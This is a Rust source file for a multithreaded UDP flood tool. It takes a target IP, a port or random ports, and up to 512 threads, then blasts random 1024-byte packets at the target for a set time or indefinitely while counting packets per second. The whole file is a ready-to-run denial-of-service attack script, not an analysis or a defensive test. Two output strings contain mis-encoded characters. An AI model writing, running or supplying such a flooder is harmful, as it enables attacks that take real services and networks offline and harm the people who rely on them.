use std::env;
use std::net::{IpAddr, SocketAddr, UdpSocket};
use std::sync::atomic::{AtomicBool, AtomicUsize, Ordering};
use std::sync::Arc;
use std::thread;
use std::time::{Duration, Instant};

fn main() {
    let args: Vec<String> = env::args().collect();
    if args.len() < 4 {
        println!("Usage: {} <target_ip> <port_or_0_for_random> <threads> [seconds_or_0_for_infinite]", args[0]);
        println!("Example: {} 192.168.1.1 0 16 60", args[0]);
        std::process::exit(1);
    }

    let target_ip_str = &args[1];
    let port_str = &args[2];
    let threads_str = &args[3];
    let duration_str = args.get(4).map(|s| s.as_str()).unwrap_or("0");

    let target_ip: IpAddr = match target_ip_str.parse() {
        Ok(ip) => ip,
        Err(_) => {
            println!("Invalid IP: {}", target_ip_str);
            std::process::exit(1);
        }
    };

    let base_port: u16 = match port_str.parse() {
        Ok(p) => p,
        Err(_) => {
            println!("Port must be a number or 0 for random");
            std::process::exit(1);
        }
    };

    let thread_count: usize = match threads_str.parse() {
        Ok(n) if n > 0 && n <= 512 => n,
        _ => {
            println!("Threads must be between 1 and 512");
            std::process::exit(1);
        }
    };

    let duration_secs: u64 = match duration_str.parse() {
        Ok(n) => n,
        Err(_) => 0,
    };

    let running = Arc::new(AtomicBool::new(true));
    let counter = Arc::new(AtomicUsize::new(0));
    let start = Instant::now();

    let time_display = if duration_secs == 0 {
        "в€ћ".to_string()
    } else {
        duration_secs.to_string()
    };

    println!(
        "Starting flood в†’ {} | threads: {} | duration: {} sec",
        target_ip, thread_count, time_display
    );

    let mut handles = vec![];

    for i in 0..thread_count {
        let running_clone = running.clone();
        let counter_clone = counter.clone();
        let target_ip_clone = target_ip;
        let base_port_clone = base_port;

        let handle = thread::spawn(move || {
            let mut payload = vec![0u8; 1024];
            for b in payload.iter_mut() {
                *b = rand::random();
            }

            let socket = match UdpSocket::bind("0.0.0.0:0") {
                Ok(s) => s,
                Err(e) => {
                    println!("Failed to create socket in thread {}: {}", i, e);
                    return;
                }
            };

            let mut sent = 0usize;

            while running_clone.load(Ordering::Relaxed) {
                let port = if base_port_clone == 0 {
                    (rand::random::<u16>() % 64512) + 1024
                } else {
                    base_port_clone + (rand::random::<u16>() % 32) as u16
                };

                let addr = SocketAddr::new(target_ip_clone, port);

                match socket.send_to(&payload, addr) {
                    Ok(_) => {
                        sent += 1;
                        if sent % 1000 == 0 {
                            counter_clone.fetch_add(1000, Ordering::Relaxed);
                        }
                    }
                    Err(_) => {
                        thread::sleep(Duration::from_millis(1));
                    }
                }

                if sent % 500 == 0 {
                    thread::yield_now();
                }
            }

            counter_clone.fetch_add(sent, Ordering::Relaxed);
        });

        handles.push(handle);
    }

    let running_clone = running.clone();
    ctrlc::set_handler(move || {
        println!("\nCtrl+C detected, stopping...");
        running_clone.store(false, Ordering::SeqCst);
    })
    .expect("Failed to set Ctrl+C handler");

    if duration_secs > 0 {
        thread::sleep(Duration::from_secs(duration_secs));
        running.store(false, Ordering::SeqCst);
    }

    for h in handles {
        let _ = h.join();
    }

    let elapsed = start.elapsed();
    let total_packets = counter.load(Ordering::Relaxed);
    let pps = if elapsed.as_secs_f64() > 0.01 {
        total_packets as f64 / elapsed.as_secs_f64()
    } else {
        total_packets as f64
    };

    println!("\nFlood stopped");
    println!("Total packets sent: {}", total_packets);
    println!("Average speed: {:.0} packets/sec", pps);
    println!("Runtime: {:.2} sec", elapsed.as_secs_f64());
}

mod rand {
    use std::cell::RefCell;
    thread_local! {
        static RNG: RefCell<WyRand> = RefCell::new(WyRand::new());
    }

    pub fn random<T: Rand>() -> T {
        RNG.with(|r| r.borrow_mut().rand())
    }

    trait Rand {
        fn rand(rng: &mut WyRand) -> Self;
    }

    impl Rand for u8 {
        fn rand(rng: &mut WyRand) -> Self {
            (rng.rand64() >> 56) as u8
        }
    }

    impl Rand for u16 {
        fn rand(rng: &mut WyRand) -> Self {
            (rng.rand64() >> 48) as u16
        }
    }

    struct WyRand(u64);

    impl WyRand {
        fn new() -> Self {
            let seed = std::time::SystemTime::now()
                .duration_since(std::time::UNIX_EPOCH)
                .map(|d| d.as_nanos() as u64)
                .unwrap_or(0x1337_42069);
            WyRand(seed.wrapping_add(0x517cc1b727220a95))
        }

        fn rand64(&mut self) -> u64 {
            self.0 = self.0.wrapping_add(0x60bee2bee120fc15);
            let mut x = self.0;
            x ^= x >> 30;
            x = x.wrapping_mul(0xbf58476d1ce4e5b9);
            x ^= x >> 27;
            x = x.wrapping_mul(0x94d049bb133111eb);
            x ^= x >> 31;
            x
        }

        fn rand<T: Rand>(&mut self) -> T {
            T::rand(self)
        }
    }
}
